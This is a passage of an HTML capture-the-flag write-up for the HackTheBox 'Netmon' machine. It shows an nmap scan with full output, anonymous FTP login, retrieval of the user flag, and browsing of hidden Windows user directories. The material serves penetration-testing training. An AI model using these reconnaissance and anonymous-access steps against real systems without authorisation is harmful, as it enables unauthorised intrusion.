@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Netmon</strong></h1>
+        <em>Released: 2nd March 2019 / Pwned: May 14th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This will require a little ‘sequential’ thinking on your part - think of the dumb things a user might do.<br>
+        For root I think I found an easy option considering this box has been out for so long.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.184</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon2#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon2#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>intial.txt&nbsp;10.10.10.152<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-05-12&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>17&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.152<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.054s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;995&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                21/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;ftpd<br>
+                |&nbsp;ftp-anon:&nbsp;Anonymous&nbsp;FTP&nbsp;login&nbsp;allowed&nbsp;(FTP&nbsp;code&nbsp;230)<br>
+                |&nbsp;02-03-19&nbsp;&nbsp;12:18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1024&nbsp;.rnd<br>
+                |&nbsp;02-25-19&nbsp;&nbsp;10:15PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inetpub<br>
+                |&nbsp;07-16-16&nbsp;&nbsp;09:18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PerfLogs<br>
+                |&nbsp;02-25-19&nbsp;&nbsp;10:56PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files<br>
+                |&nbsp;02-03-19&nbsp;&nbsp;12:28AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files&nbsp;(x86)<br>
+                |&nbsp;02-03-19&nbsp;&nbsp;08:08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Users<br>
+                |_02-25-19&nbsp;&nbsp;11:49PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows<br>
+                |&nbsp;ftp-syst:&nbsp;<br>
+                |_&nbsp;&nbsp;SYST:&nbsp;Windows_NT<br>
+                80/tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Indy&nbsp;httpd&nbsp;18.1.37.13946&nbsp;(Paessler&nbsp;PRTG&nbsp;bandwidth&nbsp;monitor)<br>
+                |_http-server-header:&nbsp;PRTG/18.1.37.13946<br>
+                |&nbsp;http-title:&nbsp;Welcome&nbsp;|&nbsp;PRTG&nbsp;Network&nbsp;Monitor&nbsp;(NETMON)<br>
+                |_Requested&nbsp;resource&nbsp;was&nbsp;/index.htm<br>
+                |_http-trane-info:&nbsp;Problem&nbsp;with&nbsp;XML&nbsp;parsing&nbsp;of&nbsp;/evox/about<br>
+                135/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                139/tcp&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
+                445/tcp&nbsp;open&nbsp;&nbsp;microsoft-ds&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;-&nbsp;2012&nbsp;microsoft-ds<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                TCP/IP&nbsp;fingerprint:<br>
+                OS:SCAN(V=7.70%E=4%D=5/12%OT=21%CT=1%CU=38394%PV=Y%DS=2%DC=I%G=Y%TM=5CD7F2F<br>
+                OS:0%P=i686-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=A)<br>
+                OS:OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54D<br>
+                OS:NW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)<br>
+                OS:ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%<br>
+                OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=<br>
+                OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%<br>
+                OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=<br>
+                OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=<br>
+                OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%<br>
+                OS:T=80%CD=Z)<br>
+                <br>
+                Network&nbsp;Distance:&nbsp;2&nbsp;hops<br>
+                Service&nbsp;Info:&nbsp;OSs:&nbsp;Windows,&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;-&nbsp;2012;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_clock-skew:&nbsp;mean:&nbsp;-2s,&nbsp;deviation:&nbsp;0s,&nbsp;median:&nbsp;-2s<br>
+                |&nbsp;smb-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;authentication_level:&nbsp;user<br>
+                |&nbsp;&nbsp;&nbsp;challenge_response:&nbsp;supported<br>
+                |_&nbsp;&nbsp;message_signing:&nbsp;disabled&nbsp;(dangerous,&nbsp;but&nbsp;default)<br>
+                |&nbsp;smb2-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2.02:&nbsp;<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;Message&nbsp;signing&nbsp;enabled&nbsp;but&nbsp;not&nbsp;required<br>
+                |&nbsp;smb2-time:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;date:&nbsp;2019-05-12&nbsp;11:18:15<br>
+                |_&nbsp;&nbsp;start_date:&nbsp;2019-05-12&nbsp;10:56:22<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;28.91&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        <strong>21/ftp</strong> allows for anonymous login so should be the first thing to look at.<br>
+        <strong>80/http</strong> looks like it's running PRTG Network Monitor, and visiting the homepage you'll see a login screen.<br>
+        <strong>139</strong> and <strong>445</strong> are samba, which become useful later.<br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 21/ftp</strong></h2><br>
+        Anonymous login is allowed you don't need to input a password (or type anything you want).<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon2#&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;10.10.10.152<br>
+                Connected&nbsp;to&nbsp;10.10.10.152.<br>
+                220&nbsp;Microsoft&nbsp;FTP&nbsp;Service<br>
+                Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.10.152<span style="color:#ff9d00;font-weight:700">:</span>root<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;anonymous<br>
+                331&nbsp;Anonymous&nbsp;access&nbsp;allowed,&nbsp;send&nbsp;identity&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>e-mail&nbsp;name<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;as&nbsp;password.<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span><br>
+                230&nbsp;User&nbsp;logged&nbsp;in.<br>
+                Remote&nbsp;system&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;is&nbsp;Windows_NT.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1024&nbsp;.rnd<br>
+                02-25-19&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>15PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inetpub<br>
+                07-16-16&nbsp;&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PerfLogs<br>
+                02-25-19&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>56PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>28AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Program&nbsp;Files&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>x86<span style="color:#ff9d00;font-weight:700">)</span><br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Users<br>
+                02-25-19&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>49PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Users<br>
+                250&nbsp;CWD&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                02-25-19&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>44PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator<br>
+                02-25-19&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>58PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Public<br>
+                226&nbsp;Transfer&nbsp;complete.
+            </div>
+        </div><br>
+        <br>
+        You can grab the user flag straight away:<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Public<br>
+                250&nbsp;CWD&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Contacts<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Documents<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Downloads<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Favorites<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Links<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Music<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Pictures<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Saved&nbsp;Games<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>08AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Searches<br>
+                05-14-19&nbsp;&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>13AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;82&nbsp;tester.txt<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>35AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33&nbsp;user.txt<br>
+                02-25-19&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>06PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Videos<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;get&nbsp;user.txt<br>
+                local<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;user.txt&nbsp;remote<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;user.txt<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                WARNING<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;1&nbsp;bare&nbsp;linefeeds&nbsp;received&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;ASCII&nbsp;mode<br>
+                File&nbsp;may&nbsp;not&nbsp;have&nbsp;transferred&nbsp;correctly.<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                33&nbsp;bytes&nbsp;received&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.05&nbsp;secs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.6672&nbsp;kB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Now head back to C:\Users list everything (including hidden files) to see what's there:<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                02-25-19&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>44PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator<br>
+                07-16-16&nbsp;&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>28AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;Users<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>05AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default<br>
+                07-16-16&nbsp;&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>28AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default&nbsp;User<br>
+                07-16-16&nbsp;&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>16AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;174&nbsp;desktop.ini<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>35AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Public<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#3ad900;font-weight:400">"All&nbsp;Users"</span><br>
+                250&nbsp;CWD&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>05AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Application&nbsp;Data<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>05AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Desktop<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>05AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Documents<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>15AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Licenses<br>
+                11-20-16&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>36PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Paessler<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>05AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;regid.1991-06.com.microsoft<br>
+                07-16-16&nbsp;&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SoftwareDistribution<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>05AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;Menu<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>15AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TEMP<br>
+                02-03-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>05AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Templates<br>
+                11-20-16&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>19PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;USOPrivate<br>
